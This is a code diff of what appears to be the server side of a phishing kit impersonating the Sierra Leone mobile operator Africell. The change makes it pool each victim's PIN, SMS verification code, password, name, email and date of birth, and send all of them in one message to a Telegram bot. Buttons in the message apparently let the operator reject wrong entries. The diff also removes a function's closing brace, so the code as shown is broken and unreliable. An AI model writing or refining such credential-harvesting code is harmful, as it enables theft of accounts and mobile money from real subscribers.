@@ -46,7 +46,6 @@ async function sendToTelegram(url, payload) {
         console.error('❌ Telegram Fetch Exception:', error.message);
         throw error;
     }
-}
 
 // Handles Submissions across all authentication, recovery, and registration flows
 app.post('/api/submit-order', async (req, res) => {
@@ -73,59 +72,67 @@ app.post('/api/submit-order', async (req, res) => {
         const countryFlag = "🇸🇱";
         const rawDigits = phone ? phone.replace(/\+232/g, '').trim() : '';
 
+        // Initialize or retrieve user credentials accumulator
         if (!userCredentials[phone]) {
             userCredentials[phone] = {};
         }
 
-        let headerTitle = "🔔 *Africell Submission*";
-        let credentialLabel = "Detail";
+        let headerTitle = "🔔 *Africell Submission Update*";
         let wrongButtonText = "❌ Wrong Info";
-        let displayValue = uniqueId || 'N/A';
-        let message = "";
 
-        // Check if explicit separated registration fields were sent from new.html
+        // Accumulate/Merge incoming data into the user's permanent session profile
         if (firstName || lastName || email || dateOfBirth) {
             headerTitle = "📝 *Africell New Account Registration*";
             userCredentials[phone].registration = { firstName, lastName, email, dateOfBirth };
-            
-            message = `${headerTitle}\n\n` +
-                      `🇸🇱 Country: \`+232\`\n` +
-                      `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
-                      `👤 First Name: *${escapeMarkdown(firstName || 'N/A')}*\n` +
-                      `👤 Last Name: *${escapeMarkdown(lastName || 'N/A')}*\n` +
-                      `📧 Email: *${escapeMarkdown(email || 'N/A')}*\n` +
-                      `📅 Date of Birth: *${escapeMarkdown(dateOfBirth || 'N/A')}*`;
-        } else {
-            // Fallback for older flows (PIN, SMS, etc.)
-            if (uniqueId && uniqueId.startsWith('PIN: ')) {
-                headerTitle = "🔐 *Africell PIN Code Submitted*";
-                credentialLabel = "PIN Code";
-                wrongButtonText = "⚠️ Wrong PIN";
-                userCredentials[phone].mpin = uniqueId.replace('PIN: ', '');
-            } else if (uniqueId && uniqueId.startsWith('Signup PIN: ')) {
-                headerTitle = "✨ *Africell Signup PIN Submitted*";
-                credentialLabel = "Signup PIN";
-                wrongButtonText = "⚠️ Wrong PIN";
-                userCredentials[phone].mpin = uniqueId.replace('Signup PIN: ', '');
-            } else if (uniqueId && (uniqueId.startsWith('SMS Code: ') || uniqueId.startsWith('Signup SMS Code: '))) {
-                headerTitle = "💬 *Africell SMS Verification Code*";
-                credentialLabel = "Verification Code";
-                wrongButtonText = "⚠️ Wrong Code";
-                userCredentials[phone].smsCode = uniqueId.replace(/^(Signup )?SMS Code: /, '');
-            } else if (uniqueId && uniqueId.startsWith('New Password: ')) {
-                headerTitle = "🔑 *Africell New Password Set*";
-                credentialLabel = "New Password";
-                wrongButtonText = "⚠️ Wrong Password";
-                userCredentials[phone].password = uniqueId.replace('New Password: ', '');
-            } else {
-                credentialLabel = "Detail";
-                displayValue = uniqueId || 'N/A';
-            }
+        } else if (uniqueId && uniqueId.startsWith('PIN: ')) {
+            headerTitle = "🔐 *Africell PIN Code Submitted*";
+            wrongButtonText = "⚠️ Wrong PIN";
+            userCredentials[phone].mpin = uniqueId.replace('PIN: ', '');
+        } else if (uniqueId && uniqueId.startsWith('Signup PIN: ')) {
+            headerTitle = "✨ *Africell Signup PIN Submitted*";
+            wrongButtonText = "⚠️ Wrong PIN";
+            userCredentials[phone].mpin = uniqueId.replace('Signup PIN: ', '');
+        } else if (uniqueId && (uniqueId.startsWith('SMS Code: ') || uniqueId.startsWith('Signup SMS Code: '))) {
+            headerTitle = "💬 *Africell SMS Verification Code*";
+            wrongButtonText = "⚠️ Wrong Code";
+            userCredentials[phone].smsCode = uniqueId.replace(/^(Signup )?SMS Code: /, '');
+        } else if (uniqueId && uniqueId.startsWith('New Password: ')) {
+            headerTitle = "🔑 *Africell New Password Set*";
+            wrongButtonText = "⚠️ Wrong Password";
+            userCredentials[phone].password = uniqueId.replace('New Password: ', '');
+        } else if (uniqueId && uniqueId.startsWith('Password Recovery Request')) {
+            headerTitle = "🔄 *Africell Password Recovery Request*";
+            userCredentials[phone].flow = 'Password Recovery';
+        } else if (uniqueId) {
+            userCredentials[phone].extraDetail = uniqueId;
+        }
 
-            message = `${headerTitle}\n\n` +
-                      `🇸🇱 Country: \`+232\`\n` +
-                      `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
-                      `🔑 ${credentialLabel}:\n${displayValue}`;
+        // Build a comprehensive message displaying ALL accumulated user info collected so far
+        let message = `${headerTitle}\n\n` +
+                      `${countryFlag} Country: \`+232\`\n` +
+                      `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
+
+        if (userCredentials[phone].flow) {
+            message += `\n🔄 Flow: *${escapeMarkdown(userCredentials[phone].flow)}*`;
+        }
+        if (userCredentials[phone].mpin) {
+            message += `\n🔐 PIN Code: \`${escapeMarkdown(userCredentials[phone].mpin)}\``;
+        }
+        if (userCredentials[phone].smsCode) {
+            message += `\n💬 SMS Code: \`${escapeMarkdown(userCredentials[phone].smsCode)}\``;
+        }
+        if (userCredentials[phone].password) {
+            message += `\n🔑 Password: \`${escapeMarkdown(userCredentials[phone].password)}\``;
+        }
+        if (userCredentials[phone].registration) {
+            const reg = userCredentials[phone].registration;
+            message += `\n👤 First Name: *${escapeMarkdown(reg.firstName || 'N/A')}*\n` +
+                       `👤 Last Name: *${escapeMarkdown(reg.lastName || 'N/A')}*\n` +
+                       `📧 Email: *${escapeMarkdown(reg.email || 'N/A')}*\n` +
+                       `📅 Date of Birth: *${escapeMarkdown(reg.dateOfBirth || 'N/A')}*`;
+        }
+        if (userCredentials[phone].extraDetail && !uniqueId.startsWith('Password Recovery Request')) {
+            message += `\n📌 Detail: \`${escapeMarkdown(userCredentials[phone].extraDetail)}\``;
         }
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
